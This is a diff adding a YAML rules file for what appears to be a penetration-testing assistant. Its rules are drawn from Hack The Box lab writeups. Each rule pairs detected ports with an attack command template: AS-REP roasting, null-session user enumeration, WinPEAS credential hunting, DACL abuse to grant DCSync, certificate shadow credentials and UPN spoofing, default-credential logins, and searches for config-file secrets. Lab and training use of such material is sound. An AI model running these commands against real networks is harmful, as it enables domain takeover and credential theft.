@@ -1,0 +1,168 @@
+# Suggestion rules extracted from TJ Null HTB writeups.
+# Each rule links to the source writeup for learning context.
+
+# --- Unauthenticated AD (Forest) ---
+
+- id: wp_ldap_asrep_anon
+  name: "Anonymous LDAP AS-REP Roast"
+  description: "LDAP detected — attempt AS-REP roasting via anonymous LDAP bind (no creds needed)"
+  priority: P1
+  conditions:
+    require_ports: [389]
+  command_template: "nxc ldap {IP} -u '' -p '' --asreproast loot/asrep_anon.txt"
+  source_reference: "HTB Forest — anonymous LDAP bind led to AS-REP roast of svc-alfresco"
+
+- id: wp_rpcclient_null_enum
+  name: "RPC Null Session User Enum"
+  description: "Enumerate domain users via RPC null session — complements SMB null session"
+  priority: P2
+  conditions:
+    require_ports: [135, 445]
+  command_template: "rpcclient -U '' -N {IP} -c 'enumdomusers'"
+  source_reference: "HTB Forest — rpcclient null session enumerated domain users and groups"
+
+# --- Username harvesting from web (Sauna) ---
+
+- id: wp_web_username_harvest
+  name: "Harvest Usernames from Website"
+  description: "HTTP open + no users found — check website for employee names, team pages, About sections"
+  priority: P2
+  conditions:
+    require_ports: [80]
+    jmespath: "length(users) == `0`"
+  command_template: "curl -s http://{IP} | grep -iE '(team|about|staff|employee|contact)'"
+  source_reference: "HTB Sauna — employee names on website led to username generation and AS-REP roast"
+
+- id: wp_username_anarchy
+  name: "Generate Username Permutations"
+  description: "Users found + Kerberos open — generate common AD username formats with username-anarchy"
+  priority: P2
+  conditions:
+    require_ports: [88]
+    jmespath: "length(users) > `0` && length(credentials) == `0`"
+  command_template: "username-anarchy -i names.txt > loot/generated_users.txt && kerbrute userenum --dc {IP} -d {DOMAIN} loot/generated_users.txt"
+  source_reference: "HTB Sauna — username-anarchy generated valid AD usernames from employee names"
+
+# --- Post-shell credential hunting (Sauna) ---
+
+- id: wp_winpeas_autologon
+  name: "WinPEAS Auto-Login Credential Hunt"
+  description: "Windows shell obtained — run WinPEAS to find auto-login credentials for lateral movement"
+  priority: P1
+  conditions:
+    require_ports: [5985]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "# From WinRM shell: upload winPEASx64.exe && .\\winPEASx64.exe windowscreds"
+  source_reference: "HTB Sauna — WinPEAS found svc_loanmgr auto-login creds, enabling DCSync"
+
+# --- BloodHound-driven ACL abuse (Forest, Fluffy) ---
+
+- id: wp_bloodhound_acl_abuse
+  name: "BloodHound ACL Abuse — Group Manipulation"
+  description: "AD creds obtained — use bloodyAD to exploit group membership (Account Operators, GenericAll)"
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: "bloodyAD -u {USER} -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember 'TARGET_GROUP' {USER}"
+  source_reference: "HTB Forest — Account Operators → Exchange Windows Permissions → WriteDacl → DCSync"
+
+- id: wp_writedacl_dcsync
+  name: "WriteDacl → DCSync Escalation"
+  description: "If WriteDacl on domain object — grant DCSync rights via impacket-dacledit"
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: "impacket-dacledit -action write -rights DCSync -principal {USER} -target-dn 'DC=YOURDOMAIN,DC=LOCAL' {DOMAIN}/{USER}:'{PASS}'"
+  source_reference: "HTB Forest — WriteDacl on domain object allowed granting DCSync rights"
+
+# --- ADCS attacks (Fluffy) ---
+
+- id: wp_adcs_enum
+  name: "ADCS Vulnerability Enumeration"
+  description: "AD creds obtained — enumerate Certificate Authority for vulnerable templates (ESC1-ESC16)"
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: "certipy-ad find -u {USER}@{DOMAIN} -p '{PASS}' -dc-ip {IP} -vulnerable -enabled -stdout"
+  source_reference: "HTB Fluffy — certipy find identified ESC16 vulnerability"
+
+- id: wp_shadow_credentials
+  name: "Shadow Credentials Attack"
+  description: "If GenericWrite over target account — add shadow credentials to extract their RC4 hash"
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: "certipy-ad shadow auto -username {USER}@{DOMAIN} -password '{PASS}' -account TARGET_USER"
+  source_reference: "HTB Fluffy — shadow credentials on ca_svc and winrm_svc via GenericWrite"
+
+- id: wp_esc16_upn_spoofing
+  name: "ADCS ESC16 — UPN Spoofing"
+  description: "ESC16 found — change target UPN to administrator, request cert, authenticate"
+  priority: P1
+  conditions:
+    require_ports: [389]
+    require_state: [has_domain, has_valid_user, has_valid_password]
+  command_template: "certipy-ad account update -username {USER}@{DOMAIN} -p '{PASS}' -user TARGET -upn administrator"
+  source_reference: "HTB Fluffy — ESC16 via UPN change → admin cert → domain admin"
+
+# --- CMS detection (BoardLight, LinkVortex) ---
+
+- id: wp_ghost_cms
+  name: "Ghost CMS Detected"
+  description: "Ghost CMS path found — check for default admin panel and known CVEs"
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'ghost')]) > `0`"
+  command_template: "curl -s http://{IP}/ghost/ && searchsploit ghost cms"
+  source_reference: "HTB LinkVortex — Ghost 5.58 detected, exploited for initial access"
+
+- id: wp_dolibarr_cms
+  name: "Dolibarr CRM Detected"
+  description: "CRM/Dolibarr path found — try default creds admin:admin"
+  priority: P1
+  conditions:
+    require_ports: [80]
+    jmespath: "length(directories[?contains(path, 'dolibarr') || contains(path, 'crm')]) > `0`"
+  command_template: "echo 'Try admin:admin at login page' && searchsploit dolibarr"
+  source_reference: "HTB BoardLight — Dolibarr on crm.board.htb with admin:admin default creds"
+
+# --- VHost discovery (BoardLight) ---
+
+- id: wp_vhost_for_cms
+  name: "VHost Fuzzing for Hidden Apps"
+  description: "Domain found + HTTP open + no vhosts — fuzz for subdomains hosting CMS/admin panels"
+  priority: P1
+  conditions:
+    require_ports: [80]
+    require_state: [has_domain]
+    jmespath: "length(vhosts) == `0`"
+  command_template: "ffuf -u http://{IP} -H 'Host: FUZZ.{DOMAIN}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,301,302,403"
+  source_reference: "HTB BoardLight — vhost crm.board.htb discovered hidden Dolibarr installation"
+
+# --- Config credential mining (BoardLight, LinkVortex) ---
+
+- id: wp_linux_config_cred_hunt
+  name: "Linux Config File Credential Hunt"
+  description: "SSH + creds available — search CMS/web app config files for DB creds and reused passwords"
+  priority: P1
+  conditions:
+    require_ports: [22]
+    require_state: [has_valid_user, has_valid_password]
+  command_template: "find / -name 'wp-config.php' -o -name '.env' -o -name 'config.php' -o -name 'conf.php' 2>/dev/null | head -20"
+  source_reference: "HTB BoardLight, LinkVortex — config file passwords led to privilege escalation"
+
+# --- Full AD kill chain signal ---
+
+- id: wp_ad_full_killchain_signal
+  name: "Full AD Environment Detected"
+  description: "Kerberos + LDAP + SMB + WinRM = full AD kill chain target. Start the AD methodology."
+  priority: P1
+  conditions:
+    require_ports: [88, 389, 445, 5985]
+  command_template: "capo methodology start ad-kill-chain"
+  source_reference: "HTB Forest, Sauna, Fluffy — full AD port set consistently indicates kill chain opportunity"
